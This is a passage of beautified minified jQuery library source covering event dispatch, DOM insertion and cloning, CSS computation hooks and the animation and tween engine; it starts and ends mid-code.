      if (
        a &&
        l.nodeType &&
        ("click" !== t.type || isNaN(t.button) || t.button < 1)
      )
        for (; l !== this; l = l.parentNode || this)
          if (1 === l.nodeType && (!0 !== l.disabled || "click" !== t.type)) {
            for (n = [], i = 0; a > i; i++)
              void 0 === n[(s = (o = e[i]).selector + " ")] &&
                (n[s] = o.needsContext
                  ? p(s, this).index(l) > -1
                  : p.find(s, this, null, [l]).length),
                n[s] && n.push(o);
            n.length && r.push({ elem: l, handlers: n });
          }
      return a < e.length && r.push({ elem: this, handlers: e.slice(a) }), r;
    },
    props:
      "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(
        " "
      ),
    fixHooks: {},
    keyHooks: {
      props: "char charCode key keyCode".split(" "),
      filter: function (t, e) {
        return (
          null == t.which &&
            (t.which = null != e.charCode ? e.charCode : e.keyCode),
          t
        );
      },
    },
    mouseHooks: {
      props:
        "button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(
          " "
        ),
      filter: function (t, e) {
        var i,
          s,
          o,
          r = e.button;
        return (
          null == t.pageX &&
            null != e.clientX &&
            ((s = (i = t.target.ownerDocument || n).documentElement),
            (o = i.body),
            (t.pageX =
              e.clientX +
              ((s && s.scrollLeft) || (o && o.scrollLeft) || 0) -
              ((s && s.clientLeft) || (o && o.clientLeft) || 0)),
            (t.pageY =
              e.clientY +
              ((s && s.scrollTop) || (o && o.scrollTop) || 0) -
              ((s && s.clientTop) || (o && o.clientTop) || 0))),
          t.which ||
            void 0 === r ||
            (t.which = 1 & r ? 1 : 2 & r ? 3 : 4 & r ? 2 : 0),
          t
        );
      },
    },
    fix: function (t) {
      if (t[p.expando]) return t;
      var e,
        i,
        s,
        o = t.type,
        r = t,
        a = this.fixHooks[o];
      for (
        a ||
          (this.fixHooks[o] = a =
            it.test(o) ? this.mouseHooks : et.test(o) ? this.keyHooks : {}),
          s = a.props ? this.props.concat(a.props) : this.props,
          t = new p.Event(r),
          e = s.length;
        e--;

      )
        t[(i = s[e])] = r[i];
      return (
        t.target || (t.target = n),
        3 === t.target.nodeType && (t.target = t.target.parentNode),
        a.filter ? a.filter(t, r) : t
      );
    },
    special: {
      load: { noBubble: !0 },
      focus: {
        trigger: function () {
          return this !== rt() && this.focus ? (this.focus(), !1) : void 0;
        },
        delegateType: "focusin",
      },
      blur: {
        trigger: function () {
          return this === rt() && this.blur ? (this.blur(), !1) : void 0;
        },
        delegateType: "focusout",
      },
      click: {
        trigger: function () {
          return "checkbox" === this.type &&
            this.click &&
            p.nodeName(this, "input")
            ? (this.click(), !1)
            : void 0;
        },
        _default: function (t) {
          return p.nodeName(t.target, "a");
        },
      },
      beforeunload: {
        postDispatch: function (t) {
          void 0 !== t.result &&
            t.originalEvent &&
            (t.originalEvent.returnValue = t.result);
        },
      },
    },
  }),
    (p.removeEvent = function (t, e, i) {
      t.removeEventListener && t.removeEventListener(e, i);
    }),
    (p.Event = function (t, e) {
      return this instanceof p.Event
        ? (t && t.type
            ? ((this.originalEvent = t),
              (this.type = t.type),
              (this.isDefaultPrevented =
                t.defaultPrevented ||
                (void 0 === t.defaultPrevented && !1 === t.returnValue)
                  ? st
                  : ot))
            : (this.type = t),
          e && p.extend(this, e),
          (this.timeStamp = (t && t.timeStamp) || p.now()),
          void (this[p.expando] = !0))
        : new p.Event(t, e);
    }),
    (p.Event.prototype = {
      constructor: p.Event,
      isDefaultPrevented: ot,
      isPropagationStopped: ot,
      isImmediatePropagationStopped: ot,
      isSimulated: !1,
      preventDefault: function () {
        var t = this.originalEvent;
        (this.isDefaultPrevented = st),
          t && !this.isSimulated && t.preventDefault();
      },
      stopPropagation: function () {
        var t = this.originalEvent;
        (this.isPropagationStopped = st),
          t && !this.isSimulated && t.stopPropagation();
      },
      stopImmediatePropagation: function () {
        var t = this.originalEvent;
        (this.isImmediatePropagationStopped = st),
          t && !this.isSimulated && t.stopImmediatePropagation(),
          this.stopPropagation();
      },
    }),
    p.each(
      {
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout",
      },
      function (t, e) {
        p.event.special[t] = {
          delegateType: e,
          bindType: e,
          handle: function (t) {
            var i,
              n = this,
              s = t.relatedTarget,
              o = t.handleObj;
            return (
              (s && (s === n || p.contains(n, s))) ||
                ((t.type = o.origType),
                (i = o.handler.apply(this, arguments)),
                (t.type = e)),
              i
            );
          },
        };
      }
    ),
    p.fn.extend({
      on: function (t, e, i, n) {
        return at(this, t, e, i, n);
      },
      one: function (t, e, i, n) {
        return at(this, t, e, i, n, 1);
      },
      off: function (t, e, i) {
        var n, s;
        if (t && t.preventDefault && t.handleObj)
          return (
            (n = t.handleObj),
            p(t.delegateTarget).off(
              n.namespace ? n.origType + "." + n.namespace : n.origType,
              n.selector,
              n.handler
            ),
            this
          );
        if ("object" == typeof t) {
          for (s in t) this.off(s, e, t[s]);
          return this;
        }
        return (
          (!1 !== e && "function" != typeof e) || ((i = e), (e = void 0)),
          !1 === i && (i = ot),
          this.each(function () {
            p.event.remove(this, t, i, e);
          })
        );
      },
    });
  var lt =
      /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,
    ct = /<script|<style|<link/i,
    ut = /checked\s*(?:[^=]|=\s*.checked.)/i,
    dt = /^true\/(.*)/,
    ht = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  function pt(t, e) {
    return p.nodeName(t, "table") &&
      p.nodeName(11 !== e.nodeType ? e : e.firstChild, "tr")
      ? t.getElementsByTagName("tbody")[0] ||
          t.appendChild(t.ownerDocument.createElement("tbody"))
      : t;
  }
  function ft(t) {
    return (t.type = (null !== t.getAttribute("type")) + "/" + t.type), t;
  }
  function gt(t) {
    var e = dt.exec(t.type);
    return e ? (t.type = e[1]) : t.removeAttribute("type"), t;
  }
  function mt(t, e) {
    var i, n, s, o, r, a, l, c;
    if (1 === e.nodeType) {
      if (
        H.hasData(t) &&
        ((o = H.access(t)), (r = H.set(e, o)), (c = o.events))
      )
        for (s in (delete r.handle, (r.events = {}), c))
          for (i = 0, n = c[s].length; n > i; i++) p.event.add(e, s, c[s][i]);
      L.hasData(t) && ((a = L.access(t)), (l = p.extend({}, a)), L.set(e, l));
    }
  }
  function vt(t, e) {
    var i = e.nodeName.toLowerCase();
    "input" === i && Q.test(t.type)
      ? (e.checked = t.checked)
      : ("input" !== i && "textarea" !== i) ||
        (e.defaultValue = t.defaultValue);
  }
  function yt(t, e, i, n) {
    e = o.apply([], e);
    var s,
      r,
      a,
      l,
      c,
      u,
      h = 0,
      f = t.length,
      g = f - 1,
      m = e[0],
      v = p.isFunction(m);
    if (v || (f > 1 && "string" == typeof m && !d.checkClone && ut.test(m)))
      return t.each(function (s) {
        var o = t.eq(s);
        v && (e[0] = m.call(this, s, o.html())), yt(o, e, i, n);
      });
    if (
      f &&
      ((r = (s = tt(e, t[0].ownerDocument, !1, t, n)).firstChild),
      1 === s.childNodes.length && (s = r),
      r || n)
    ) {
      for (l = (a = p.map(Z(s, "script"), ft)).length; f > h; h++)
        (c = s),
          h !== g &&
            ((c = p.clone(c, !0, !0)), l && p.merge(a, Z(c, "script"))),
          i.call(t[h], c, h);
      if (l)
        for (u = a[a.length - 1].ownerDocument, p.map(a, gt), h = 0; l > h; h++)
          (c = a[h]),
            K.test(c.type || "") &&
              !H.access(c, "globalEval") &&
              p.contains(u, c) &&
              (c.src
                ? p._evalUrl && p._evalUrl(c.src)
                : p.globalEval(c.textContent.replace(ht, "")));
    }
    return t;
  }
  function _t(t, e, i) {
    for (var n, s = e ? p.filter(e, t) : t, o = 0; null != (n = s[o]); o++)
      i || 1 !== n.nodeType || p.cleanData(Z(n)),
        n.parentNode &&
          (i && p.contains(n.ownerDocument, n) && G(Z(n, "script")),
          n.parentNode.removeChild(n));
    return t;
  }
  p.extend({
    htmlPrefilter: function (t) {
      return t.replace(lt, "<$1></$2>");
    },
    clone: function (t, e, i) {
      var n,
        s,
        o,
        r,
        a = t.cloneNode(!0),
        l = p.contains(t.ownerDocument, t);
      if (
        !(
          d.noCloneChecked ||
          (1 !== t.nodeType && 11 !== t.nodeType) ||
          p.isXMLDoc(t)
        )
      )
        for (r = Z(a), n = 0, s = (o = Z(t)).length; s > n; n++) vt(o[n], r[n]);
      if (e)
        if (i)
          for (o = o || Z(t), r = r || Z(a), n = 0, s = o.length; s > n; n++)
            mt(o[n], r[n]);
        else mt(t, a);
      return (r = Z(a, "script")).length > 0 && G(r, !l && Z(t, "script")), a;
    },
    cleanData: function (t) {
      for (var e, i, n, s = p.event.special, o = 0; void 0 !== (i = t[o]); o++)
        if (M(i)) {
          if ((e = i[H.expando])) {
            if (e.events)
              for (n in e.events)
                s[n] ? p.event.remove(i, n) : p.removeEvent(i, n, e.handle);
            i[H.expando] = void 0;
          }
          i[L.expando] && (i[L.expando] = void 0);
        }
    },
  }),
    p.fn.extend({
      domManip: yt,
      detach: function (t) {
        return _t(this, t, !0);
      },
      remove: function (t) {
        return _t(this, t);
      },
      text: function (t) {
        return P(
          this,
          function (t) {
            return void 0 === t
              ? p.text(this)
              : this.empty().each(function () {
                  (1 !== this.nodeType &&
                    11 !== this.nodeType &&
                    9 !== this.nodeType) ||
                    (this.textContent = t);
                });
          },
          null,
          t,
          arguments.length
        );
      },
      append: function () {
        return yt(this, arguments, function (t) {
          (1 !== this.nodeType &&
            11 !== this.nodeType &&
            9 !== this.nodeType) ||
            pt(this, t).appendChild(t);
        });
      },
      prepend: function () {
        return yt(this, arguments, function (t) {
          if (
            1 === this.nodeType ||
            11 === this.nodeType ||
            9 === this.nodeType
          ) {
            var e = pt(this, t);
            e.insertBefore(t, e.firstChild);
          }
        });
      },
      before: function () {
        return yt(this, arguments, function (t) {
          this.parentNode && this.parentNode.insertBefore(t, this);
        });
      },
      after: function () {
        return yt(this, arguments, function (t) {
          this.parentNode && this.parentNode.insertBefore(t, this.nextSibling);
        });
      },
      empty: function () {
        for (var t, e = 0; null != (t = this[e]); e++)
          1 === t.nodeType && (p.cleanData(Z(t, !1)), (t.textContent = ""));
        return this;
      },
      clone: function (t, e) {
        return (
          (t = null != t && t),
          (e = null == e ? t : e),
          this.map(function () {
            return p.clone(this, t, e);
          })
        );
      },
      html: function (t) {
        return P(
          this,
          function (t) {
            var e = this[0] || {},
              i = 0,
              n = this.length;
            if (void 0 === t && 1 === e.nodeType) return e.innerHTML;
            if (
              "string" == typeof t &&
              !ct.test(t) &&
              !X[(Y.exec(t) || ["", ""])[1].toLowerCase()]
            ) {
              t = p.htmlPrefilter(t);
              try {
                for (; n > i; i++)
                  1 === (e = this[i] || {}).nodeType &&
                    (p.cleanData(Z(e, !1)), (e.innerHTML = t));
                e = 0;
              } catch (t) {}
            }
            e && this.empty().append(t);
          },
          null,
          t,
          arguments.length
        );
      },
      replaceWith: function () {
        var t = [];
        return yt(
          this,
          arguments,
          function (e) {
            var i = this.parentNode;
            p.inArray(this, t) < 0 &&
              (p.cleanData(Z(this)), i && i.replaceChild(e, this));
          },
          t
        );
      },
    }),
    p.each(
      {
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith",
      },
      function (t, e) {
        p.fn[t] = function (t) {
          for (var i, n = [], s = p(t), o = s.length - 1, a = 0; o >= a; a++)
            (i = a === o ? this : this.clone(!0)),
              p(s[a])[e](i),
              r.apply(n, i.get());
          return this.pushStack(n);
        };
      }
    );
  var wt,
    bt = { HTML: "block", BODY: "block" };
  function Ct(t, e) {
    var i = p(e.createElement(t)).appendTo(e.body),
      n = p.css(i[0], "display");
    return i.detach(), n;
  }
  function xt(t) {
    var e = n,
      i = bt[t];
    return (
      i ||
        (("none" !== (i = Ct(t, e)) && i) ||
          ((e = (wt = (
            wt || p("<iframe frameborder='0' width='0' height='0'/>")
          ).appendTo(e.documentElement))[0].contentDocument).write(),
          e.close(),
          (i = Ct(t, e)),
          wt.detach()),
        (bt[t] = i)),
      i
    );
  }
  var Tt = /^margin/,
    kt = new RegExp("^(" + R + ")(?!px)[a-z%]+$", "i"),
    St = function (e) {
      var i = e.ownerDocument.defaultView;
      return (i && i.opener) || (i = t), i.getComputedStyle(e);
    },
    Et = function (t, e, i, n) {
      var s,
        o,
        r = {};
      for (o in e) (r[o] = t.style[o]), (t.style[o] = e[o]);
      for (o in ((s = i.apply(t, n || [])), e)) t.style[o] = r[o];
      return s;
    },
    At = n.documentElement;
  function Dt(t, e, i) {
    var n,
      s,
      o,
      r,
      a = t.style;
    return (
      ("" !== (r = (i = i || St(t)) ? i.getPropertyValue(e) || i[e] : void 0) &&
        void 0 !== r) ||
        p.contains(t.ownerDocument, t) ||
        (r = p.style(t, e)),
      i &&
        !d.pixelMarginRight() &&
        kt.test(r) &&
        Tt.test(e) &&
        ((n = a.width),
        (s = a.minWidth),
        (o = a.maxWidth),
        (a.minWidth = a.maxWidth = a.width = r),
        (r = i.width),
        (a.width = n),
        (a.minWidth = s),
        (a.maxWidth = o)),
      void 0 !== r ? r + "" : r
    );
  }
  function It(t, e) {
    return {
      get: function () {
        return t()
          ? void delete this.get
          : (this.get = e).apply(this, arguments);
      },
    };
  }
  !(function () {
    var e,
      i,
      s,
      o,
      r = n.createElement("div"),
      a = n.createElement("div");
    if (a.style) {
      function l() {
        (a.style.cssText =
          "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%"),
          (a.innerHTML = ""),
          At.appendChild(r);
        var n = t.getComputedStyle(a);
        (e = "1%" !== n.top),
          (o = "2px" === n.marginLeft),
          (i = "4px" === n.width),
          (a.style.marginRight = "50%"),
          (s = "4px" === n.marginRight),
          At.removeChild(r);
      }
      (a.style.backgroundClip = "content-box"),
        (a.cloneNode(!0).style.backgroundClip = ""),
        (d.clearCloneStyle = "content-box" === a.style.backgroundClip),
        (r.style.cssText =
          "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute"),
        r.appendChild(a),
        p.extend(d, {
          pixelPosition: function () {
            return l(), e;
          },
          boxSizingReliable: function () {
            return null == i && l(), i;
          },
          pixelMarginRight: function () {
            return null == i && l(), s;
          },
          reliableMarginLeft: function () {
            return null == i && l(), o;
          },
          reliableMarginRight: function () {
            var e,
              i = a.appendChild(n.createElement("div"));
            return (
              (i.style.cssText = a.style.cssText =
                "-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0"),
              (i.style.marginRight = i.style.width = "0"),
              (a.style.width = "1px"),
              At.appendChild(r),
              (e = !parseFloat(t.getComputedStyle(i).marginRight)),
              At.removeChild(r),
              a.removeChild(i),
              e
            );
          },
        });
    }
  })();
  var $t = /^(none|table(?!-c[ea]).+)/,
    Ot = { position: "absolute", visibility: "hidden", display: "block" },
    Nt = { letterSpacing: "0", fontWeight: "400" },
    Pt = ["Webkit", "O", "Moz", "ms"],
    Mt = n.createElement("div").style;
  function jt(t) {
    if (t in Mt) return t;
    for (var e = t[0].toUpperCase() + t.slice(1), i = Pt.length; i--; )
      if ((t = Pt[i] + e) in Mt) return t;
  }
  function Ht(t, e, i) {
    var n = q.exec(e);
    return n ? Math.max(0, n[2] - (i || 0)) + (n[3] || "px") : e;
  }
  function Lt(t, e, i, n, s) {
    for (
      var o = i === (n ? "border" : "content") ? 4 : "width" === e ? 1 : 0,
        r = 0;
      4 > o;
      o += 2
    )
      "margin" === i && (r += p.css(t, i + B[o], !0, s)),
        n
          ? ("content" === i && (r -= p.css(t, "padding" + B[o], !0, s)),
            "margin" !== i && (r -= p.css(t, "border" + B[o] + "Width", !0, s)))
          : ((r += p.css(t, "padding" + B[o], !0, s)),
            "padding" !== i &&
              (r += p.css(t, "border" + B[o] + "Width", !0, s)));
    return r;
  }
  function zt(t, e, i) {
    var n = !0,
      s = "width" === e ? t.offsetWidth : t.offsetHeight,
      o = St(t),
      r = "border-box" === p.css(t, "boxSizing", !1, o);
    if (0 >= s || null == s) {
      if (
        ((0 > (s = Dt(t, e, o)) || null == s) && (s = t.style[e]), kt.test(s))
      )
        return s;
      (n = r && (d.boxSizingReliable() || s === t.style[e])),
        (s = parseFloat(s) || 0);
    }
    return s + Lt(t, e, i || (r ? "border" : "content"), n, o) + "px";
  }
  function Wt(t, e) {
    for (var i, n, s, o = [], r = 0, a = t.length; a > r; r++)
      (n = t[r]).style &&
        ((o[r] = H.get(n, "olddisplay")),
        (i = n.style.display),
        e
          ? (o[r] || "none" !== i || (n.style.display = ""),
            "" === n.style.display &&
              U(n) &&
              (o[r] = H.access(n, "olddisplay", xt(n.nodeName))))
          : ((s = U(n)),
            ("none" === i && s) ||
              H.set(n, "olddisplay", s ? i : p.css(n, "display"))));
    for (r = 0; a > r; r++)
      (n = t[r]).style &&
        ((e && "none" !== n.style.display && "" !== n.style.display) ||
          (n.style.display = e ? o[r] || "" : "none"));
    return t;
  }
  function Ft(t, e, i, n, s) {
    return new Ft.prototype.init(t, e, i, n, s);
  }
  p.extend({
    cssHooks: {
      opacity: {
        get: function (t, e) {
          if (e) {
            var i = Dt(t, "opacity");
            return "" === i ? "1" : i;
          }
        },
      },
    },
    cssNumber: {
      animationIterationCount: !0,
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
    },
    cssProps: { float: "cssFloat" },
    style: function (t, e, i, n) {
      if (t && 3 !== t.nodeType && 8 !== t.nodeType && t.style) {
        var s,
          o,
          r,
          a = p.camelCase(e),
          l = t.style;
        return (
          (e = p.cssProps[a] || (p.cssProps[a] = jt(a) || a)),
          (r = p.cssHooks[e] || p.cssHooks[a]),
          void 0 === i
            ? r && "get" in r && void 0 !== (s = r.get(t, !1, n))
              ? s
              : l[e]
            : ("string" === (o = typeof i) &&
                (s = q.exec(i)) &&
                s[1] &&
                ((i = V(t, e, s)), (o = "number")),
              void (
                null != i &&
                i == i &&
                ("number" === o &&
                  (i += (s && s[3]) || (p.cssNumber[a] ? "" : "px")),
                d.clearCloneStyle ||
                  "" !== i ||
                  0 !== e.indexOf("background") ||
                  (l[e] = "inherit"),
                (r && "set" in r && void 0 === (i = r.set(t, i, n))) ||
                  (l[e] = i))
              ))
        );
      }
    },
    css: function (t, e, i, n) {
      var s,
        o,
        r,
        a = p.camelCase(e);
      return (
        (e = p.cssProps[a] || (p.cssProps[a] = jt(a) || a)),
        (r = p.cssHooks[e] || p.cssHooks[a]) &&
          "get" in r &&
          (s = r.get(t, !0, i)),
        void 0 === s && (s = Dt(t, e, n)),
        "normal" === s && e in Nt && (s = Nt[e]),
        "" === i || i
          ? ((o = parseFloat(s)), !0 === i || isFinite(o) ? o || 0 : s)
          : s
      );
    },
  }),
    p.each(["height", "width"], function (t, e) {
      p.cssHooks[e] = {
        get: function (t, i, n) {
          return i
            ? $t.test(p.css(t, "display")) && 0 === t.offsetWidth
              ? Et(t, Ot, function () {
                  return zt(t, e, n);
                })
              : zt(t, e, n)
            : void 0;
        },
        set: function (t, i, n) {
          var s,
            o = n && St(t),
            r =
              n &&
              Lt(t, e, n, "border-box" === p.css(t, "boxSizing", !1, o), o);
          return (
            r &&
              (s = q.exec(i)) &&
              "px" !== (s[3] || "px") &&
              ((t.style[e] = i), (i = p.css(t, e))),
            Ht(0, i, r)
          );
        },
      };
    }),
    (p.cssHooks.marginLeft = It(d.reliableMarginLeft, function (t, e) {
      return e
        ? (parseFloat(Dt(t, "marginLeft")) ||
            t.getBoundingClientRect().left -
              Et(t, { marginLeft: 0 }, function () {
                return t.getBoundingClientRect().left;
              })) + "px"
        : void 0;
    })),
    (p.cssHooks.marginRight = It(d.reliableMarginRight, function (t, e) {
      return e
        ? Et(t, { display: "inline-block" }, Dt, [t, "marginRight"])
        : void 0;
    })),
    p.each({ margin: "", padding: "", border: "Width" }, function (t, e) {
      (p.cssHooks[t + e] = {
        expand: function (i) {
          for (
            var n = 0, s = {}, o = "string" == typeof i ? i.split(" ") : [i];
            4 > n;
            n++
          )
            s[t + B[n] + e] = o[n] || o[n - 2] || o[0];
          return s;
        },
      }),
        Tt.test(t) || (p.cssHooks[t + e].set = Ht);
    }),
    p.fn.extend({
      css: function (t, e) {
        return P(
          this,
          function (t, e, i) {
            var n,
              s,
              o = {},
              r = 0;
            if (p.isArray(e)) {
              for (n = St(t), s = e.length; s > r; r++)
                o[e[r]] = p.css(t, e[r], !1, n);
              return o;
            }
            return void 0 !== i ? p.style(t, e, i) : p.css(t, e);
          },
          t,
          e,
          arguments.length > 1
        );
      },
      show: function () {
        return Wt(this, !0);
      },
      hide: function () {
        return Wt(this);
      },
      toggle: function (t) {
        return "boolean" == typeof t
          ? t
            ? this.show()
            : this.hide()
          : this.each(function () {
              U(this) ? p(this).show() : p(this).hide();
            });
      },
    }),
    (p.Tween = Ft),
    (Ft.prototype = {
      constructor: Ft,
      init: function (t, e, i, n, s, o) {
        (this.elem = t),
          (this.prop = i),
          (this.easing = s || p.easing._default),
          (this.options = e),
          (this.start = this.now = this.cur()),
          (this.end = n),
          (this.unit = o || (p.cssNumber[i] ? "" : "px"));
      },
      cur: function () {
        var t = Ft.propHooks[this.prop];
        return t && t.get ? t.get(this) : Ft.propHooks._default.get(this);
      },
      run: function (t) {
        var e,
          i = Ft.propHooks[this.prop];
        return (
          this.options.duration
            ? (this.pos = e =
                p.easing[this.easing](
                  t,
                  this.options.duration * t,
                  0,
                  1,
                  this.options.duration
                ))
            : (this.pos = e = t),
          (this.now = (this.end - this.start) * e + this.start),
          this.options.step &&
            this.options.step.call(this.elem, this.now, this),
          i && i.set ? i.set(this) : Ft.propHooks._default.set(this),
          this
        );
      },
    }),
    (Ft.prototype.init.prototype = Ft.prototype),
    (Ft.propHooks = {
      _default: {
        get: function (t) {
          var e;
          return 1 !== t.elem.nodeType ||
            (null != t.elem[t.prop] && null == t.elem.style[t.prop])
            ? t.elem[t.prop]
            : (e = p.css(t.elem, t.prop, "")) && "auto" !== e
            ? e
            : 0;
        },
        set: function (t) {
          p.fx.step[t.prop]
            ? p.fx.step[t.prop](t)
            : 1 !== t.elem.nodeType ||
              (null == t.elem.style[p.cssProps[t.prop]] && !p.cssHooks[t.prop])
            ? (t.elem[t.prop] = t.now)
            : p.style(t.elem, t.prop, t.now + t.unit);
        },
      },
    }),
    (Ft.propHooks.scrollTop = Ft.propHooks.scrollLeft =
      {
        set: function (t) {
          t.elem.nodeType && t.elem.parentNode && (t.elem[t.prop] = t.now);
        },
      }),
    (p.easing = {
      linear: function (t) {
        return t;
      },
      swing: function (t) {
        return 0.5 - Math.cos(t * Math.PI) / 2;
      },
      _default: "swing",
    }),
    (p.fx = Ft.prototype.init),
    (p.fx.step = {});
  var Rt,
    qt,
    Bt = /^(?:toggle|show|hide)$/,
    Ut = /queueHooks$/;
  function Vt() {
    return (
      t.setTimeout(function () {
        Rt = void 0;
      }),
      (Rt = p.now())
    );
  }
  function Qt(t, e) {
    var i,
      n = 0,
      s = { height: t };
    for (e = e ? 1 : 0; 4 > n; n += 2 - e)
      s["margin" + (i = B[n])] = s["padding" + i] = t;
    return e && (s.opacity = s.width = t), s;
  }
  function Yt(t, e, i) {
    for (
      var n,
        s = (Kt.tweeners[e] || []).concat(Kt.tweeners["*"]),
        o = 0,
        r = s.length;
      r > o;
      o++
    )
      if ((n = s[o].call(i, e, t))) return n;
  }
  function Kt(t, e, i) {
    var n,
      s,
      o = 0,
      r = Kt.prefilters.length,
      a = p.Deferred().always(function () {
        delete l.elem;
      }),
      l = function () {
        if (s) return !1;
        for (
          var e = Rt || Vt(),
            i = Math.max(0, c.startTime + c.duration - e),
            n = 1 - (i / c.duration || 0),
            o = 0,
            r = c.tweens.length;
          r > o;
          o++
        )
          c.tweens[o].run(n);
        return (
          a.notifyWith(t, [c, n, i]),
          1 > n && r ? i : (a.resolveWith(t, [c]), !1)
        );
      },
      c = a.promise({
        elem: t,
        props: p.extend({}, e),
        opts: p.extend(!0, { specialEasing: {}, easing: p.easing._default }, i),
        originalProperties: e,
        originalOptions: i,
        startTime: Rt || Vt(),
        duration: i.duration,
        tweens: [],
        createTween: function (e, i) {
          var n = p.Tween(
            t,
            c.opts,
            e,
            i,
            c.opts.specialEasing[e] || c.opts.easing
          );
          return c.tweens.push(n), n;
        },
        stop: function (e) {
          var i = 0,
            n = e ? c.tweens.length : 0;
          if (s) return this;
          for (s = !0; n > i; i++) c.tweens[i].run(1);
          return (
            e
              ? (a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c, e]))
              : a.rejectWith(t, [c, e]),
            this
          );
        },
      }),
      u = c.props;
    for (
      (function (t, e) {
        var i, n, s, o, r;
        for (i in t)
          if (
            ((s = e[(n = p.camelCase(i))]),
            (o = t[i]),
            p.isArray(o) && ((s = o[1]), (o = t[i] = o[0])),
            i !== n && ((t[n] = o), delete t[i]),
            (r = p.cssHooks[n]) && ("expand" in r))
          )
            for (i in ((o = r.expand(o)), delete t[n], o))
              (i in t) || ((t[i] = o[i]), (e[i] = s));
          else e[n] = s;
      })(u, c.opts.specialEasing);
      r > o;
      o++
    )
      if ((n = Kt.prefilters[o].call(c, t, u, c.opts)))
        return (
          p.isFunction(n.stop) &&
            (p._queueHooks(c.elem, c.opts.queue).stop = p.proxy(n.stop, n)),
          n
        );
    return (
      p.map(u, Yt, c),
      p.isFunction(c.opts.start) && c.opts.start.call(t, c),
      p.fx.timer(p.extend(l, { elem: t, anim: c, queue: c.opts.queue })),
      c
        .progress(c.opts.progress)
        .done(c.opts.done, c.opts.complete)
        .fail(c.opts.fail)
        .always(c.opts.always)
    );
  }
  (p.Animation = p.extend(Kt, {
    tweeners: {
      "*": [
        function (t, e) {
          var i = this.createTween(t, e);
          return V(i.elem, t, q.exec(e), i), i;
        },
      ],
    },
    tweener: function (t, e) {
      p.isFunction(t) ? ((e = t), (t = ["*"])) : (t = t.match(O));
      for (var i, n = 0, s = t.length; s > n; n++)
        (i = t[n]),
          (Kt.tweeners[i] = Kt.tweeners[i] || []),
          Kt.tweeners[i].unshift(e);
    },
    prefilters: [
      function (t, e, i) {
        var n,
          s,
          o,
          r,
          a,
          l,
          c,
          u = this,
          d = {},
          h = t.style,
          f = t.nodeType && U(t),
          g = H.get(t, "fxshow");
        for (n in (i.queue ||
          (null == (a = p._queueHooks(t, "fx")).unqueued &&
            ((a.unqueued = 0),
            (l = a.empty.fire),
            (a.empty.fire = function () {
              a.unqueued || l();
            })),
          a.unqueued++,
          u.always(function () {
            u.always(function () {
              a.unqueued--, p.queue(t, "fx").length || a.empty.fire();
            });
          })),
        1 === t.nodeType &&
          ("height" in e || "width" in e) &&
          ((i.overflow = [h.overflow, h.overflowX, h.overflowY]),
          "inline" ===
            ("none" === (c = p.css(t, "display"))
              ? H.get(t, "olddisplay") || xt(t.nodeName)
              : c) &&
            "none" === p.css(t, "float") &&
            (h.display = "inline-block")),
        i.overflow &&
          ((h.overflow = "hidden"),
          u.always(function () {
            (h.overflow = i.overflow[0]),
              (h.overflowX = i.overflow[1]),
              (h.overflowY = i.overflow[2]);
          })),
        e))
          if (((s = e[n]), Bt.exec(s))) {
            if (
              (delete e[n],
              (o = o || "toggle" === s),
              s === (f ? "hide" : "show"))
            ) {
              if ("show" !== s || !g || void 0 === g[n]) continue;
              f = !0;
            }
            d[n] = (g && g[n]) || p.style(t, n);
          } else c = void 0;
        if (p.isEmptyObject(d))
          "inline" === ("none" === c ? xt(t.nodeName) : c) && (h.display = c);
        else
          for (n in (g
            ? "hidden" in g && (f = g.hidden)
            : (g = H.access(t, "fxshow", {})),
          o && (g.hidden = !f),
          f
            ? p(t).show()
            : u.done(function () {
                p(t).hide();
              }),
          u.done(function () {
            var e;
            for (e in (H.remove(t, "fxshow"), d)) p.style(t, e, d[e]);
          }),
          d))
            (r = Yt(f ? g[n] : 0, n, u)),
              n in g ||
                ((g[n] = r.start),
                f &&
                  ((r.end = r.start),
                  (r.start = "width" === n || "height" === n ? 1 : 0)));
      },
    ],
    prefilter: function (t, e) {
      e ? Kt.prefilters.unshift(t) : Kt.prefilters.push(t);
    },
  })),
    (p.speed = function (t, e, i) {
      var n =
        t && "object" == typeof t
          ? p.extend({}, t)
          : {
              complete: i || (!i && e) || (p.isFunction(t) && t),
              duration: t,
              easing: (i && e) || (e && !p.isFunction(e) && e),
            };
      return (
        (n.duration = p.fx.off
          ? 0
          : "number" == typeof n.duration
          ? n.duration
          : n.duration in p.fx.speeds
          ? p.fx.speeds[n.duration]
          : p.fx.speeds._default),
        (null != n.queue && !0 !== n.queue) || (n.queue = "fx"),
        (n.old = n.complete),
        (n.complete = function () {
          p.isFunction(n.old) && n.old.call(this),
            n.queue && p.dequeue(this, n.queue);
        }),
        n
      );
    }),
    p.fn.extend({
      fadeTo: function (t, e, i, n) {
        return this.filter(U)
          .css("opacity", 0)
          .show()
          .end()
          .animate({ opacity: e }, t, i, n);
      },
      animate: function (t, e, i, n) {
        var s = p.isEmptyObject(t),
          o = p.speed(e, i, n),
          r = function () {
            var e = Kt(this, p.extend({}, t), o);
            (s || H.get(this, "finish")) && e.stop(!0);
          };
        return (
          (r.finish = r),
          s || !1 === o.queue ? this.each(r) : this.queue(o.queue, r)
        );
      },
      stop: function (t, e, i) {
        var n = function (t) {
          var e = t.stop;
          delete t.stop, e(i);
        };
        return (
          "string" != typeof t && ((i = e), (e = t), (t = void 0)),
          e && !1 !== t && this.queue(t || "fx", []),
          this.each(function () {
            var e = !0,
              s = null != t && t + "queueHooks",
              o = p.timers,
